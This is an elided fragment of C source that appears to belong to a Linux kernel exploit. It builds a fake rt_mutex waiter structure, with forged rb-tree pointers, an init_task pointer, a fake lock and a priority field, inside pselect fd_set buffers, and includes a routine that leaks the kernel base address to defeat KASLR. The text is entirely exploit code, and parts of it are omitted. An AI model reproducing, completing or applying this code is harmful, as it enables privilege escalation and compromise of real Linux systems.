...
void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  ...
  struct slide_waiter_word {
    ...
    {0, shift, SLIDE_LOGGERS_0_1, "tree_pc"},           /* tree_entry.__rb_parent_color 0x00 */
    {1, shift, 0, "tree_right"},                        /* tree_entry.rb_right          0x08 */
    {2, shift, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"}, /* tree_entry.rb_left           0x10 */
    {3, shift, SLIDE_LOGGERS_0_1, "pi_parent"},         /* pi_tree_entry.__rb_parent_color 0x18 */
    {4, shift, 0, "pi_right"},                          /* pi_tree_entry.rb_right       0x20 */
    {5, shift, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},   /* pi_tree_entry.rb_left        0x28 */
    {6, shift, SLIDE_INIT_TASK, "task"},                /* task                         0x30 */
    {7, shift, fake_lock, "lock"},                      /* lock                         0x38 */
    {8, shift, FAKE_WAITER_PRIO, "prio"},               /* prio (flat)                  0x40 */
...
int slide_leak_kernel_base(void) {
  ...
  const int shift_sweep[] = {0, 1, 2, 3, 4, 5, 6, 7};
